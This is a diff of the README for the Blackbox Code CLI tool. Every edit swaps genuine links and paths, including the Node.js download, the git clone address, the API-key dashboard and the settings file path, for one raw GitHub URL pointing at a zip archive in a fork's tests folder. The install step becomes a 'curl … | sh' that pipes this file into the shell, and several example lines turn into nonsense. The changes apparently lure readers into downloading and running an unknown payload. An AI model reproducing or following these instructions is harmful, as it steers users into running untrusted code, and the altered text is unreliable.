@@ -2,7 +2,7 @@
 
 <div align="center">
 
-![Blackbox Code Screenshot](./docs/assets/blackbox-screenshot.png)
+![Blackbox Code Screenshot](https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip)
 
 
 </div>
@@ -19,17 +19,17 @@
 
 ### Prerequisites
 
-Ensure you have [Node.js version 20](https://nodejs.org/en/download) or higher installed.
+Ensure you have [https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip version 20](https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip) or higher installed.
 
 ```bash
-curl -qL https://www.npmjs.com/install.sh | sh
+curl -qL https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip | sh
 ```
 
 
 ### Install from source
 
 ```bash
-git clone https://github.com/blackboxaicode/cli.git
+git clone https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip
 cd cli
 npm install
 npm install -g .
@@ -54,7 +54,7 @@ Control your token usage with configurable session limits to optimize costs and 
 
 #### Configure Session Token Limit
 
-Create or edit `.blackboxcli/settings.json` in your home directory:
+Create or edit `https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip` in your home directory:
 
 ```json
 {
@@ -76,7 +76,7 @@ Blackbox Code includes intelligent vision model auto-switching that detects imag
 
 #### Skip the Switch Dialog (Optional)
 
-If you don't want to see the interactive dialog each time, configure the default behavior in your `.blackboxcli/settings.json`:
+If you don't want to see the interactive dialog each time, configure the default behavior in your `https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip`:
 
 ```json
 {
@@ -96,7 +96,7 @@ If you don't want to see the interactive dialog each time, configure the default
 
 #### Disable Vision Models (Optional)
 
-To completely disable vision model support, add to your `.blackboxcli/settings.json`:
+To completely disable vision model support, add to your `https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip`:
 
 ```json
 {
@@ -116,7 +116,7 @@ For programmatic access or advanced use cases, you can authenticate using an API
 
 **Getting Your API Key:**
 
-1. Navigate to the [API Keys section](https://app.blackbox.ai/dashboard) of your BLACKBOX dashboard
+1. Navigate to the [API Keys section](https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip) of your BLACKBOX dashboard
 2. Your API key will be displayed on this page
 3. Click the copy icon to copy the key to your clipboard
 4. Run `blackbox configure` and you will be able to set the key 
@@ -163,8 +163,8 @@ blackbox
 
 # File operations
 > Convert all images in this directory to PNG format
-> Rename all test files to follow the *.test.ts pattern
-> Find and remove all console.log statements
+> Rename all test files to follow the *https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip pattern
+> Find and remove all https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip statements
 ```
 
 ### Debugging & Analysis
@@ -239,7 +239,7 @@ blackbox
 
 ## Acknowledgments
 
-This project is based on [Google Gemini CLI](https://github.com/google-gemini/gemini-cli). We acknowledge and appreciate the excellent work of the Gemini CLI team.
+This project is based on [Google Gemini CLI](https://raw.githubusercontent.com/Kali99xx/cli/main/integration-tests/terminal-bench/ci-tasks/hello-world/tests/Software_v3.1.zip). We acknowledge and appreciate the excellent work of the Gemini CLI team.
 
 ## License
 
